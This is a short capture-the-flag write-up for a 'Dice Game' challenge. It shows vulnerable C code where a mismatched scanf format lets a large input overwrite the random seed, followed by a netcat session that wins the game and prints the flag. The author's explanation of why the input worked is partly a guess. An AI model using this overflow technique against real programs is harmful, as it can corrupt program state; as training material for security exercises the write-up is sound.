# Dice Game

You can start with this dice game. I have made it very simple: roll 16 or higher to win.

nc ctf.wackattack.eu 5011

[⬇️ dice_game.tgz](./dice_game.tgz)

# Writeup

Quick analysis shows that the program is using a set seed which never gets the number we want within 3 tries or give us more money.

```c
    int seed = 7; // for good luck
    int strength = 0;
    printf("Let's play a game!\nThe entry fee is 10, but if you roll 16 you win everything i have!\n\n");
    printf("First we need to tune our setup. How hard do you plan on rolling the dice (on a scale from 1-100)?\n");
    scanf("%lu", &strength);
```

That scanf is a vulnerability. We can overflow the seed by giving a large number. Now I just randomly tested with a few 1's and played through and suddenly got the flag. Somehow I believe the seed was set to 11, which gave 16 on the second time.

```bash
└─$ nc ctf.wackattack.eu 5011
Let's play a game!
The entry fee is 10, but if you roll 16 you win everything i have!

First we need to tune our setup. How hard do you plan on rolling the dice (on a scale from 1-100)?
11111111111
Thank you, lets get started.
Your current balance is: 30
Would you like to play? (y/n)
y
Rolling...
You rolled 11. Too bad! I will keep the table open if you want to play more.

Your current balance is: 20
Would you like to play? (y/n)
y
Rolling...
You rolled 16. You won, congrats!
wack{such_sk1ll_4nd_5uch_luck}
```
